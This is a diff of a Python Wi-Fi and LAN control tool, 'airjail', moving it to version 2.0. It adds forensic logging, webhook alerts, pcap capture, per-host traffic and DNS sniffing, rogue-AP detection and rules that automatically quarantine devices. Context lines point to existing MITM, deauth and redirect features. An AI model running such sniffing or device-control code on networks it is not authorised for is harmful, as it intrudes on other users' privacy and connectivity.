@@ -25,6 +25,11 @@ import threading
 import socket
 import re
 import json
+import signal
+import csv
+import logging
+from pathlib import Path
+from io import StringIO
 from datetime import datetime, timedelta
 import glob
 from collections import defaultdict
@@ -34,23 +39,23 @@ from collections import defaultdict
 #  Runs before any import so missing deps are fixed silently first.
 # ══════════════════════════════════════════════════════════════════════════════
 
-VERSION    = "1.4.0"
+VERSION    = "2.0.0"
 REPO_URL   = "https://github.com/0xb0rn3/airjail"
 
 # ── system packages needed per distro ────────────────────────────────────────
 _SYS_PKGS = {
     # pkg-manager  : list of package names
-    "pacman" : ["python-pip", "python-scapy", "nmap", "net-tools",
+    "pacman" : ["python-pip", "python-scapy", "nmap", "net-tools", "tcpdump",
                  "aircrack-ng", "iptables", "iw", "wireless_tools"],
-    "apt"    : ["python3-pip", "python3-scapy", "nmap", "net-tools",
+    "apt"    : ["python3-pip", "python3-scapy", "nmap", "net-tools", "tcpdump",
                  "aircrack-ng", "iptables", "iw", "wireless-tools",
                  "libpcap-dev"],
-    "dnf"    : ["python3-pip", "nmap", "net-tools", "aircrack-ng",
+    "dnf"    : ["python3-pip", "nmap", "net-tools", "aircrack-ng", "tcpdump",
                  "iptables", "iw", "wireless-tools", "libpcap-devel"],
 }
 
 # ── python packages needed ────────────────────────────────────────────────────
-_PY_PKGS = ["rich", "scapy", "requests", "manuf"]
+_PY_PKGS = ["rich", "scapy", "requests", "manuf", "flask"]
 
 # ── detect distro ─────────────────────────────────────────────────────────────
 def _detect_pm():
@@ -191,8 +196,11 @@ import requests
 
 try:
     from scapy.all import (ARP, Ether, srp, sendp, send, sniff,
-                            IP, TCP, UDP, DNS, DNSQR, conf, get_if_list)
-    from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
+                            IP, TCP, UDP, DNS, DNSQR, conf, get_if_list,
+                            ICMP, Raw, wrpcap, rdpcap, hexdump)
+    from scapy.layers.dot11 import (Dot11, Dot11Deauth, Dot11Beacon,
+                                     Dot11ProbeReq, Dot11ProbeResp,
+                                     Dot11Elt, Dot11Auth, RadioTap)
     SCAPY_OK = True
 except Exception:
     SCAPY_OK = False
@@ -202,6 +210,12 @@ try:
     MANUF_OK = True
 except Exception:
     MANUF_OK = False
+
+try:
+    from flask import Flask, jsonify, render_template_string
+    FLASK_OK = True
+except Exception:
+    FLASK_OK = False
 
 console = Console()
 
@@ -233,6 +247,29 @@ _arp_table   = {}      # ip → mac — ARP change detection across scans
 _mitm_sessions  = {}    # ip → {stop_ev, thread} — active MITM sessions
 MONITOR_IFACES  = {}    # phy → {mon_iface, method, started}
 _scan_results   = []    # alias for _SCAN_CACHE — used by deauth picker
+
+# ── v2.0 globals ─────────────────────────────────────────────────────────────
+PCAP_DIR         = "/var/lib/airjail/pcap"
+_pcap_sessions   = {}
+TRAFFIC_STATS    = defaultdict(lambda: defaultdict(int))
+PROTOCOL_LOG     = defaultdict(list)
+KNOWN_APS        = {}
+ROGUE_ALERTS     = []
+_rogue_stop      = threading.Event()
+_rogue_thread    = None
+QUARANTINE_RULES = []
+_quarantine_file = "/var/lib/airjail/quarantine_rules.json"
+INJECT_LOG       = []
+NOTIFY_CONFIG    = {
+    "telegram": {"enabled": False, "bot_token": "", "chat_id": ""},
+    "discord":  {"enabled": False, "webhook_url": ""},
+}
+_notify_file     = "/var/lib/airjail/notify.json"
+FORENSIC_LOG_FILE = "/var/lib/airjail/forensic.jsonl"
+_forensic_lock   = threading.Lock()
+_dashboard_app   = None
+_dashboard_thread = None
+DASHBOARD_PORT   = 8888
 
 # ══════════════════════════════════════════════════════════════════════════════
 #  SECTION 2.5 — USB ADAPTER ENGINE
@@ -2252,73 +2289,962 @@ def menu_monitor_mode() -> None:
             input("\nEnter to continue...")
 
 
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  SECTION 12 — FORENSIC LOGGING ENGINE  (v2.0)
+# ══════════════════════════════════════════════════════════════════════════════
+
+def _forensic_init():
+    os.makedirs(os.path.dirname(FORENSIC_LOG_FILE), exist_ok=True)
+
+def forensic_event(event_type: str, data: dict):
+    _forensic_init()
+    entry = {"ts": datetime.now().isoformat(), "type": event_type,
+             "iface": IFACE, **data}
+    with _forensic_lock:
+        try:
+            with open(FORENSIC_LOG_FILE, "a") as f:
+                f.write(json.dumps(entry) + "\n")
+        except Exception:
+            pass
+    _notify_push(event_type, entry)
+
+def forensic_read(limit: int = 100, event_type: str = "") -> list:
+    try:
+        lines = Path(FORENSIC_LOG_FILE).read_text().strip().splitlines()
+    except Exception:
+        return []
+    entries = []
+    for line in reversed(lines):
+        try:
+            e = json.loads(line)
+            if event_type and e.get("type") != event_type:
+                continue
+            entries.append(e)
+            if len(entries) >= limit:
+                break
+        except Exception:
+            continue
+    return entries
+
+def forensic_export_csv(path: str, limit: int = 500) -> bool:
+    entries = forensic_read(limit)
+    if not entries:
+        return False
+    try:
+        keys = sorted(set(k for e in entries for k in e.keys()))
+        with open(path, "w", newline="") as f:
+            w = csv.DictWriter(f, fieldnames=keys, extrasaction="ignore")
+            w.writeheader()
+            w.writerows(entries)
+        return True
+    except Exception:
+        return False
+
+def menu_forensic():
+    while True:
+        clear(); banner()
+        console.print("[bold cyan]── Forensic Log & Reporting ──[/]\n")
+        entries = forensic_read(20)
+        if entries:
+            tbl = Table(box=box.ROUNDED, border_style="cyan", show_lines=True,
+                        title=f"[bold cyan]Recent Events ({len(entries)})[/]")
+            tbl.add_column("Time",    style="dim",    width=20)
+            tbl.add_column("Type",    style="yellow", width=16)
+            tbl.add_column("Details", style="green",  width=50)
+            for e in entries:
+                detail = "  ".join(f"{k}={v}" for k, v in e.items()
+                                   if k not in ("ts", "type", "iface"))[:50]
+                tbl.add_row(e.get("ts", "?")[:19], e.get("type", "?"), detail)
+            console.print(tbl)
+        else:
+            console.print("[dim]No forensic events recorded yet.[/]")
+        console.print("\n  [bold yellow][V][/] View by type   "
+                      "[bold cyan][E][/] Export CSV   "
+                      "[bold red][C][/] Clear   [dim][Q][/] Back")
+        ch = Prompt.ask("[bold cyan]forensic >[/]").upper()
+        if ch == "Q":
+            break
+        elif ch == "V":
+            etype = Prompt.ask("[cyan]Event type[/]", default="").strip()
+            for e in forensic_read(50, etype):
+                console.print(f"[dim]{e.get('ts','?')[:19]}[/]  "
+                              f"[yellow]{e.get('type','?')}[/]  "
+                              f"{json.dumps({k:v for k,v in e.items() if k not in ('ts','type','iface')})}")
+        elif ch == "E":
+            path = Prompt.ask("[cyan]Export path[/]",
+                              default="/var/lib/airjail/forensic_export.csv")
+            console.print(f"[green][✓] Exported.[/]" if forensic_export_csv(path) else "[red]Failed.[/]")
+        elif ch == "C":
+            if Confirm.ask("[red]Clear forensic log?[/]"):
+                try: open(FORENSIC_LOG_FILE, "w").close(); console.print("[green]Cleared.[/]")
+                except Exception: console.print("[red]Failed.[/]")
+        if ch != "Q":
+            input("\nEnter to continue...")
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  SECTION 13 — NOTIFICATION ENGINE (Telegram / Discord)  (v2.0)
+# ══════════════════════════════════════════════════════════════════════════════
+
+def _notify_load():
+    global NOTIFY_CONFIG
+    try:
+        with open(_notify_file) as f:
+            NOTIFY_CONFIG.update(json.load(f))
+    except Exception:
+        pass
+
+def _notify_save():
+    os.makedirs(os.path.dirname(_notify_file), exist_ok=True)
+    try:
+        with open(_notify_file, "w") as f:
+            json.dump(NOTIFY_CONFIG, f, indent=2)
+    except Exception:
+        pass
+
+def _notify_push(event_type: str, data: dict):
+    def _send():
+        msg = f"🔒 airjail | {event_type}\n"
+        for k, v in data.items():
+            if k not in ("ts", "type"):
+                msg += f"  {k}: {v}\n"
+        tg = NOTIFY_CONFIG.get("telegram", {})
+        if tg.get("enabled") and tg.get("bot_token") and tg.get("chat_id"):
+            try:
+                requests.post(
+                    f"https://api.telegram.org/bot{tg['bot_token']}/sendMessage",
+                    json={"chat_id": tg["chat_id"], "text": msg}, timeout=5)
+            except Exception:
+                pass
+        dc = NOTIFY_CONFIG.get("discord", {})
+        if dc.get("enabled") and dc.get("webhook_url"):
+            try:
+                requests.post(dc["webhook_url"],
+                              json={"content": f"```\n{msg}\n```"}, timeout=5)
+            except Exception:
+                pass
+    threading.Thread(target=_send, daemon=True).start()
+
+def menu_notifications():
+    _notify_load()
+    while True:
+        clear(); banner()
+        console.print("[bold cyan]── Notification Settings ──[/]\n")
+        tg = NOTIFY_CONFIG["telegram"]; dc = NOTIFY_CONFIG["discord"]
+        tg_s = "[green]on[/]" if tg["enabled"] else "[red]off[/]"
+        dc_s = "[green]on[/]" if dc["enabled"] else "[red]off[/]"
+        console.print(f"  Telegram: {tg_s}   Discord: {dc_s}\n")
+        console.print("  [bold yellow][1][/] Configure Telegram\n"
+                      "  [bold magenta][2][/] Configure Discord\n"
+                      "  [bold green] [3][/] Send test\n  [dim][Q][/] Back")
+        ch = Prompt.ask("[bold cyan]notify >[/]").upper()
+        if ch == "Q": break
+        elif ch == "1":
+            tg["bot_token"] = Prompt.ask("[cyan]Bot token[/]", default=tg["bot_token"])
+            tg["chat_id"]   = Prompt.ask("[cyan]Chat ID[/]", default=tg["chat_id"])
+            tg["enabled"]   = Confirm.ask("[cyan]Enable Telegram?[/]")
+            _notify_save(); console.print("[green][✓] Saved.[/]")
+        elif ch == "2":
+            dc["webhook_url"] = Prompt.ask("[cyan]Webhook URL[/]", default=dc["webhook_url"])
+            dc["enabled"]     = Confirm.ask("[cyan]Enable Discord?[/]")
+            _notify_save(); console.print("[green][✓] Saved.[/]")
+        elif ch == "3":
+            _notify_push("test", {"message": "airjail notification test"})
+            console.print("[green][✓] Test sent.[/]")
+        if ch != "Q": input("\nEnter to continue...")
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  SECTION 14 — PCAP CAPTURE ENGINE  (v2.0)
+# ══════════════════════════════════════════════════════════════════════════════
+
+def _pcap_ensure_dir():
+    os.makedirs(PCAP_DIR, exist_ok=True)
+
+def pcap_start(name: str = "", iface: str = "", bpf: str = "",
+               target_ip: str = "") -> str:
+    _pcap_ensure_dir()
+    if not name:
+        name = f"cap_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+    if not iface:
+        iface = IFACE or "any"
+    path = os.path.join(PCAP_DIR, f"{name}.pcap")
+    cmd = ["tcpdump", "-i", iface, "-w", path, "-U"]
+    if bpf:
+        cmd += bpf.split()
+    elif target_ip:
+        cmd += ["host", target_ip]
+    stop_ev = threading.Event()
+    def _run():
+        try:
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
+                                    stderr=subprocess.DEVNULL)
+            while not stop_ev.is_set():
+                stop_ev.wait(timeout=1)
+            proc.terminate(); proc.wait(timeout=5)
+        except Exception: pass
+    t = threading.Thread(target=_run, daemon=True); t.start()
+    _pcap_sessions[name] = {"stop_ev": stop_ev, "thread": t, "path": path,
+                             "iface": iface, "bpf": bpf,
+                             "started": datetime.now().isoformat()}
+    forensic_event("pcap_start", {"name": name, "path": path, "iface": iface})
+    return path
+
+def pcap_stop(name: str) -> str | None:
+    sess = _pcap_sessions.pop(name, None)
+    if not sess: return None
+    sess["stop_ev"].set()
+    if sess["thread"].is_alive(): sess["thread"].join(timeout=5)
+    forensic_event("pcap_stop", {"name": name, "path": sess["path"]})
+    return sess["path"]
+
+def pcap_list_files() -> list:
+    _pcap_ensure_dir()
+    files = []
+    for f in sorted(glob.glob(os.path.join(PCAP_DIR, "*.pcap*"))):
+        stat = os.stat(f)
+        files.append({"path": f, "name": os.path.basename(f),
+                       "size": stat.st_size,
+                       "modified": datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S")})
+    return files
+
+def pcap_analyze(path: str) -> dict:
+    if not SCAPY_OK: return {"error": "scapy unavailable"}
+    try: pkts = rdpcap(path, count=5000)
+    except Exception as e: return {"error": str(e)}
+    stats = {"total_packets": len(pkts), "protocols": defaultdict(int),
+             "src_ips": defaultdict(int), "dst_ips": defaultdict(int),
+             "ports": defaultdict(int)}
+    for pkt in pkts:
+        if pkt.haslayer(TCP):  stats["protocols"]["TCP"] += 1; stats["ports"][pkt[TCP].dport] += 1
+        elif pkt.haslayer(UDP): stats["protocols"]["UDP"] += 1; stats["ports"][pkt[UDP].dport] += 1
+        elif pkt.haslayer(ICMP): stats["protocols"]["ICMP"] += 1
+        if pkt.haslayer(IP):
+            stats["src_ips"][pkt[IP].src] += 1; stats["dst_ips"][pkt[IP].dst] += 1
+        if pkt.haslayer(DNS): stats["protocols"]["DNS"] += 1
+        if pkt.haslayer(ARP): stats["protocols"]["ARP"] += 1
+    for k in ("protocols","src_ips","dst_ips","ports"):
+        stats[k] = dict(sorted(dict(stats[k]).items(), key=lambda x: -x[1])[:20])
+    return stats
+
+def menu_pcap():
+    while True:
+        clear(); banner()
+        console.print("[bold cyan]── PCAP Capture Manager ──[/]\n")
+        if _pcap_sessions:
+            tbl = Table(box=box.ROUNDED, border_style="green", title="[bold green]Active[/]")
+            tbl.add_column("Name", style="cyan"); tbl.add_column("Iface", style="yellow")
+            tbl.add_column("Path", style="green"); tbl.add_column("Started", style="dim")
+            for n, s in _pcap_sessions.items():
+                tbl.add_row(n, s["iface"], s["path"], s["started"][:19])
+            console.print(tbl)
+        else:
+            console.print("[dim]No active captures.[/]")
+        console.print("\n  [bold green][S][/] Start   [bold red][X][/] Stop   "
+                      "[bold cyan][L][/] List   [bold yellow][A][/] Analyze   "
+                      "[bold magenta][D][/] Delete   [dim][Q][/] Back")
+        ch = Prompt.ask("[bold cyan]pcap >[/]").upper()
+        if ch == "Q": break
+        elif ch == "S":
+            name = Prompt.ask("[cyan]Name[/]", default=f"cap_{datetime.now().strftime('%H%M%S')}")
+            iface = Prompt.ask("[cyan]Interface[/]", default=IFACE or "any")
+            target = Prompt.ask("[cyan]Target IP (blank=all)[/]", default="")
+            bpf = Prompt.ask("[cyan]BPF filter (blank=default)[/]", default="")
+            console.print(f"[green][✓] Capturing → {pcap_start(name, iface, bpf, target)}[/]")
+        elif ch == "X":
+            if not _pcap_sessions: console.print("[yellow]None active.[/]")
+            else:
+                for n in _pcap_sessions: console.print(f"  [cyan]{n}[/]")
+                name = Prompt.ask("[cyan]Name[/]")
+                p = pcap_stop(name)
+                if p: console.print(f"[green][✓] Stopped → {p} ({_fmt(os.path.getsize(p) if os.path.exists(p) else 0)})[/]")
+                else: console.print("[red]Not found.[/]")
+        elif ch == "L":
+            files = pcap_list_files()
+            if files:
+                tbl = Table(box=box.ROUNDED, border_style="cyan")
+                tbl.add_column("#", style="dim", width=4); tbl.add_column("Name", style="cyan")
+                tbl.add_column("Size", style="green"); tbl.add_column("Date", style="dim")
+                for i, f in enumerate(files, 1):
+                    tbl.add_row(str(i), f["name"], _fmt(f["size"]), f["modified"])
+                console.print(tbl)
+            else: console.print("[dim]No captures.[/]")
+        elif ch == "A":
+            files = pcap_list_files()
+            if not files: console.print("[yellow]None.[/]"); input("\nEnter..."); continue
+            for i, f in enumerate(files, 1):
+                console.print(f"  [{i}] {f['name']}  ({_fmt(f['size'])})")
+            sel = Prompt.ask("[cyan]File #[/]").strip()
+            if sel.isdigit() and 1 <= int(sel) <= len(files):
+                with console.status("[cyan]Analyzing..."):
+                    stats = pcap_analyze(files[int(sel)-1]["path"])
+                if "error" in stats: console.print(f"[red]{stats['error']}[/]")
+                else:
+                    console.print(f"\n  Packets: [green]{stats['total_packets']}[/]")
+                    console.print(f"  Protocols: {stats['protocols']}")
+                    console.print(f"  Top src: {dict(list(stats['src_ips'].items())[:5])}")
+                    console.print(f"  Top dst: {dict(list(stats['dst_ips'].items())[:5])}")
+                    console.print(f"  Top ports: {dict(list(stats['ports'].items())[:10])}")
+        elif ch == "D":
+            files = pcap_list_files()
+            if files:
+                for i, f in enumerate(files, 1): console.print(f"  [{i}] {f['name']}")
+                sel = Prompt.ask("[cyan]# to delete (0=all)[/]").strip()
+                if sel == "0" and Confirm.ask("[red]Delete ALL?[/]"):
+                    for f in files: os.remove(f["path"])
+                elif sel.isdigit() and 1 <= int(sel) <= len(files):
+                    os.remove(files[int(sel)-1]["path"])
+                console.print("[green][✓] Done.[/]")
+        if ch != "Q": input("\nEnter to continue...")
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  SECTION 15 — TRAFFIC ANALYSIS & PROTOCOL BREAKDOWN  (v2.0)
+# ══════════════════════════════════════════════════════════════════════════════
+
+_traffic_stop = threading.Event()
+_traffic_thread = None
+
+def _traffic_callback(pkt):
+    if not pkt.haslayer(IP): return
+    src, dst, size = pkt[IP].src, pkt[IP].dst, len(pkt)
+    proto, port = "OTHER", 0
+    if pkt.haslayer(TCP):
+        port = pkt[TCP].dport
+        proto = {80:"HTTP",8080:"HTTP",443:"HTTPS",22:"SSH",21:"FTP",
+                 25:"SMTP",587:"SMTP",3389:"RDP"}.get(port, "TCP")
+    elif pkt.haslayer(UDP):
+        port = pkt[UDP].dport
+        proto = {53:"DNS",67:"DHCP",68:"DHCP",5353:"mDNS",1900:"SSDP"}.get(port, "UDP")
+    elif pkt.haslayer(ICMP):
+        proto = "ICMP"
+    TRAFFIC_STATS[src][proto] += size
+    TRAFFIC_STATS[dst][f"{proto}_in"] += size
+    log = PROTOCOL_LOG[src]
+    log.append({"proto": proto, "src": src, "dst": dst, "port": port,
+                "size": size, "time": datetime.now().strftime("%H:%M:%S")})
+    if len(log) > 500: PROTOCOL_LOG[src] = log[-500:]
+
+def _start_traffic():
+    global _traffic_thread
+    if _traffic_thread and _traffic_thread.is_alive(): return
+    _traffic_stop.clear()
+    def _run():
+        sniff(iface=IFACE, prn=_traffic_callback, store=False,
+              stop_filter=lambda _: _traffic_stop.is_set())
+    _traffic_thread = threading.Thread(target=_run, daemon=True)
+    _traffic_thread.start()
+
+def _stop_traffic():
+    _traffic_stop.set()
+
+def menu_traffic():
+    _start_traffic()
+    console.print("[green][✓] Traffic analyzer started.[/]\n")
+    while True:
+        clear(); banner()
+        console.print("[bold cyan]── Traffic Analysis & Protocol Breakdown ──[/]\n")
+        if not TRAFFIC_STATS:
+            console.print("[yellow]Collecting... stay on this screen.[/]")
+        else:
+            tbl = Table(box=box.ROUNDED, border_style="cyan", show_lines=True,
+                        title="[bold cyan]Protocol Usage by Host[/]")
+            tbl.add_column("IP",    style="green",  width=16)
+            tbl.add_column("HTTP",  style="yellow", width=10, justify="right")
+            tbl.add_column("HTTPS", style="cyan",   width=10, justify="right")
+            tbl.add_column("DNS",   style="blue",   width=10, justify="right")
+            tbl.add_column("SSH",   style="magenta",width=10, justify="right")
+            tbl.add_column("Other", style="dim",    width=10, justify="right")
+            tbl.add_column("Total", style="bold",   width=10, justify="right")
+            for ip, protos in sorted(TRAFFIC_STATS.items(),
+                                     key=lambda x: sum(x[1].values()), reverse=True)[:20]:
+                http  = protos.get("HTTP",0)+protos.get("HTTP_in",0)
+                https = protos.get("HTTPS",0)+protos.get("HTTPS_in",0)
+                dns   = protos.get("DNS",0)+protos.get("DNS_in",0)
+                ssh   = protos.get("SSH",0)+protos.get("SSH_in",0)
+                total = sum(protos.values())
+                tbl.add_row(ip, _fmt(http), _fmt(https), _fmt(dns),
+                            _fmt(ssh), _fmt(total-http-https-dns-ssh), _fmt(total))
+            console.print(tbl)
+            # Global bars
+            gp = defaultdict(int)
+            for protos in TRAFFIC_STATS.values():
+                for p, b in protos.items():
+                    gp[p.replace("_in","")] += b
+            total_all = sum(gp.values()) or 1
+            console.print("\n[bold]Global Protocol Distribution:[/]")
+            for p, b in sorted(gp.items(), key=lambda x: -x[1])[:8]:
+                pct = (b/total_all)*100
+                bar = "█"*int(pct/3) + "░"*(33-int(pct/3))
+                console.print(f"  [cyan]{p:>10}[/]  {bar}  [bold]{pct:5.1f}%[/]  ({_fmt(b)})")
+        console.print("\n[dim]  [R] Refresh   [D] Device detail   [X] Stop   [Q] Back[/]")
+        ch = Prompt.ask("", default="R").upper()
+        if ch == "Q": break
+        elif ch == "X": _stop_traffic(); console.print("[yellow]Stopped.[/]"); break
+        elif ch == "D":
+            ip = Prompt.ask("[cyan]IP[/]").strip()
+            if ip in PROTOCOL_LOG:
+                tbl2 = Table(box=box.SIMPLE, border_style="cyan")
+                tbl2.add_column("Time",style="dim"); tbl2.add_column("Proto",style="yellow")
+                tbl2.add_column("Dst",style="green"); tbl2.add_column("Port",style="cyan")
+                tbl2.add_column("Size",style="bold")
+                for e in PROTOCOL_LOG[ip][-20:]:
+                    tbl2.add_row(e["time"],e["proto"],e["dst"],str(e["port"]),_fmt(e["size"]))
+                console.print(tbl2)
+            else: console.print(f"[yellow]No data for {ip}[/]")
+            input("\nEnter to continue...")
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  SECTION 16 — ROGUE AP / EVIL TWIN DETECTION  (v2.0)
+# ══════════════════════════════════════════════════════════════════════════════
+
+def _rogue_cb(pkt):
+    if not pkt.haslayer(Dot11Beacon) and not pkt.haslayer(Dot11ProbeResp): return
+    bssid = (pkt[Dot11].addr3 or "").lower()
+    if not bssid: return
+    ssid, channel = "", "?"
+    try:
+        elt = pkt[Dot11Elt]
+        while elt:
+            if elt.ID == 0: ssid = elt.info.decode(errors="ignore"); break
+            elt = elt.payload.getlayer(Dot11Elt)
+    except Exception: pass
+    try:
+        elt = pkt[Dot11Elt]
+        while elt:
+            if elt.ID == 3: channel = str(elt.info[0]); break
+            elt = elt.payload.getlayer(Dot11Elt)
+    except Exception: pass
+    sig = "?"
+    if pkt.haslayer(RadioTap):
+        try: sig = pkt[RadioTap].dBm_AntSignal
+        except Exception: pass
+    cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}{Dot11ProbeResp:%Dot11ProbeResp.cap%}")
+    enc = "WEP/WPA" if "privacy" in cap.lower() else "OPEN"
+    now = datetime.now().strftime("%H:%M:%S")
+    vendor = mac_vendor(bssid) if MANUF_OK else "?"
+    is_new = bssid not in KNOWN_APS
+    prev = KNOWN_APS.get(bssid)
+    if is_new:
+        KNOWN_APS[bssid] = {"ssid":ssid,"channel":channel,"enc":enc,
+                             "first_seen":now,"last_seen":now,"vendor":vendor,"signal":sig}
+    else:
+        KNOWN_APS[bssid]["last_seen"] = now; KNOWN_APS[bssid]["signal"] = sig
+    alerts = []
+    if ssid:
+        twins = [b for b, i in KNOWN_APS.items() if i["ssid"]==ssid and b!=bssid]
+        if twins:
+            alerts.append({"bssid":bssid,"ssid":ssid,"channel":channel,"time":now,"signal":sig,
+                           "reason":f"Evil Twin — '{ssid}' also on {', '.join(twins[:3])}"})
+    if prev and prev["channel"] != channel and prev["channel"] != "?":
+        alerts.append({"bssid":bssid,"ssid":ssid,"channel":channel,"time":now,"signal":sig,
+                       "reason":f"Channel change: {prev['channel']} → {channel}"})
+    sus = ("free wifi","open wifi","xfinity","attwifi","linksys","netgear","default")
+    if ssid.lower().strip() in sus and is_new:
+        alerts.append({"bssid":bssid,"ssid":ssid,"channel":channel,"time":now,"signal":sig,
+                       "reason":f"Suspicious SSID: '{ssid}'"})
+    for a in alerts:
+        ROGUE_ALERTS.append(a); forensic_event("rogue_ap", a); LED.mitm_alert()
+
+def _start_rogue(mon_iface: str):
+    global _rogue_thread
+    if _rogue_thread and _rogue_thread.is_alive(): return
+    _rogue_stop.clear()
+    def _run():
+        sniff(iface=mon_iface, prn=_rogue_cb, store=False,
+              stop_filter=lambda _: _rogue_stop.is_set())
+    _rogue_thread = threading.Thread(target=_run, daemon=True); _rogue_thread.start()
+
+def _stop_rogue():
+    _rogue_stop.set()
+
+def menu_rogue_ap():
+    while True:
+        clear(); banner()
+        console.print("[bold red]── Rogue AP / Evil Twin Detection ──[/]\n")
+        scanning = _rogue_thread and _rogue_thread.is_alive()
+        console.print(f"  Scanner: {'[green]on[/]' if scanning else '[red]off[/]'}  "
+                      f"APs: [cyan]{len(KNOWN_APS)}[/]  "
+                      f"Alerts: [{'red' if ROGUE_ALERTS else 'dim'}]{len(ROGUE_ALERTS)}[/]\n")
+        if ROGUE_ALERTS:
+            atbl = Table(box=box.ROUNDED, border_style="red", title="[bold red]⚠ Alerts[/]")
+            atbl.add_column("Time",style="dim",width=10); atbl.add_column("BSSID",style="yellow",width=20)
+            atbl.add_column("SSID",style="cyan",width=20); atbl.add_column("Reason",style="red",width=40)
+            for a in ROGUE_ALERTS[-15:]:
+                atbl.add_row(a["time"],a["bssid"],a["ssid"],a["reason"])
+            console.print(atbl)
+        if KNOWN_APS:
+            aptbl = Table(box=box.ROUNDED, border_style="cyan",
+                          title=f"[bold cyan]APs ({len(KNOWN_APS)})[/]")
+            aptbl.add_column("BSSID",style="yellow",width=20); aptbl.add_column("SSID",style="green",width=20)
+            aptbl.add_column("Ch",style="magenta",width=5); aptbl.add_column("Enc",style="cyan",width=10)
+            aptbl.add_column("Sig",style="blue",width=8); aptbl.add_column("Vendor",style="dim",width=14)
+            for b, i in sorted(KNOWN_APS.items(), key=lambda x: x[1]["last_seen"], reverse=True)[:25]:
+                aptbl.add_row(b,i["ssid"],str(i["channel"]),i["enc"],str(i.get("signal","?")),i["vendor"])
+            console.print(aptbl)
+        console.print("\n  [bold green][S][/] Start (needs monitor)   [bold red][X][/] Stop   "
+                      "[bold cyan][C][/] Clear alerts   [dim][Q][/] Back")
+        ch = Prompt.ask("[bold cyan]rogue >[/]").upper()
+        if ch == "Q": break
+        elif ch == "S":
+            mon = _pick_monitor_iface()
+            if mon: _start_rogue(mon); console.print(f"[green][✓] Scanning on {mon}[/]")
+            else: console.print("[red]No monitor iface. Use [M] first.[/]")
+        elif ch == "X": _stop_rogue(); console.print("[yellow]Stopped.[/]")
+        elif ch == "C": ROGUE_ALERTS.clear(); console.print("[green]Cleared.[/]")
+        if ch != "Q": input("\nEnter to continue...")
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  SECTION 17 — AUTO-QUARANTINE POLICY ENGINE  (v2.0)
+# ══════════════════════════════════════════════════════════════════════════════
+
+def _quarantine_load():
+    global QUARANTINE_RULES
+    try:
+        with open(_quarantine_file) as f: QUARANTINE_RULES = json.load(f)
+    except Exception: QUARANTINE_RULES = []
+
+def _quarantine_save():
+    os.makedirs(os.path.dirname(_quarantine_file), exist_ok=True)
+    try:
+        with open(_quarantine_file, "w") as f: json.dump(QUARANTINE_RULES, f, indent=2)
+    except Exception: pass
+
+_quar_stop = threading.Event()
+_quar_thread = None
+
+def _auto_jail(ip: str, reason: str):
+    mac = next((d["mac"].lower() for d in _scan_results if d["ip"]==ip), "unknown")
+    if mac in JAILED: return
+    if REDIRECT_IP: _redirect_on(ip, REDIRECT_IP, REDIRECT_PORT)
+    JAILED[mac] = {"ip":ip, "reason":f"[AUTO] {reason}",
+                    "time":datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+    LED.jail_flash(); session_save()
+    forensic_event("auto_quarantine", {"ip":ip,"mac":mac,"reason":reason})
+
+def _quar_enforce():
+    while not _quar_stop.is_set():
+        for rule in QUARANTINE_RULES:
+            if not rule.get("enabled"): continue
+            try:
+                rt = rule["type"]
+                if rt == "bandwidth":
+                    thresh = rule.get("threshold_mb",500)*1_048_576
+                    for ip, bw in BW_STATS.items():
+                        if bw["rx"]+bw["tx"] > thresh:
+                            _auto_jail(ip, f"BW>{rule['threshold_mb']}MB")
+                elif rt == "time":
+                    now_h = datetime.now().hour
+                    s, e = rule.get("start_hour",23), rule.get("end_hour",6)
+                    in_w = (now_h>=s or now_h<e) if s>e else (s<=now_h<e)
+                    if in_w:
+                        for mac in rule.get("targets",[]):
+                            if mac.lower() not in JAILED:
+                                dev = next((d for d in _scan_results if d["mac"].lower()==mac.lower()), None)
+                                if dev: _auto_jail(dev["ip"], f"Curfew {s}:00-{e}:00")
+                elif rt == "protocol":
+                    for ip, protos in TRAFFIC_STATS.items():
+                        for bp in rule.get("blocked_protocols",[]):
+                            if protos.get(bp,0)>0: _auto_jail(ip, f"Blocked: {bp}")
+                elif rt == "dns":
+                    for mac, domains in DNS_LOG.items():
+                        for dom in domains[-20:]:
+                            for bd in rule.get("blocked_domains",[]):
+                                if bd.lower() in dom.lower():
+                                    dev = next((d for d in _scan_results if d["mac"].lower()==mac), None)
+                                    if dev and dev["mac"].lower() not in JAILED:
+                                        _auto_jail(dev["ip"], f"Blocked DNS: {dom}")
+            except Exception: continue
+        _quar_stop.wait(timeout=10)
+
+def _start_quar():
+    global _quar_thread
+    if _quar_thread and _quar_thread.is_alive(): return
+    _quar_stop.clear()
+    _quar_thread = threading.Thread(target=_quar_enforce, daemon=True); _quar_thread.start()
+
+def _stop_quar():
+    _quar_stop.set()
+
+def menu_quarantine():
+    _quarantine_load()
+    while True:
+        clear(); banner()
+        console.print("[bold yellow]── Auto-Quarantine Policy Engine ──[/]\n")
+        running = _quar_thread and _quar_thread.is_alive()
+        console.print(f"  Engine: {'[green]running[/]' if running else '[red]stopped[/]'}  "
+                      f"Rules: [cyan]{len(QUARANTINE_RULES)}[/]\n")
+        if QUARANTINE_RULES:
+            tbl = Table(box=box.ROUNDED, border_style="yellow", show_lines=True)
+            tbl.add_column("#",style="dim",width=4); tbl.add_column("Type",style="cyan",width=12)
+            tbl.add_column("Description",style="green",width=35)
+            tbl.add_column("Status",style="bold",width=10)
+            for i, r in enumerate(QUARANTINE_RULES, 1):
+                tbl.add_row(str(i), r["type"], r.get("description","—"),
+                            "[green]on[/]" if r.get("enabled") else "[red]off[/]")
+            console.print(tbl)
+        console.print(
+            "\n  [bold green][1][/] Add BW rule       [bold cyan][2][/] Add curfew rule\n"
+            "  [bold yellow][3][/] Add protocol rule  [bold magenta][4][/] Add DNS rule\n"
+            "  [bold red][D][/] Delete rule      [bold green][E][/] Toggle on/off\n"
+            "  [bold green][S][/] Start engine     [bold red][X][/] Stop engine\n"
+            "  [dim][Q][/] Back")
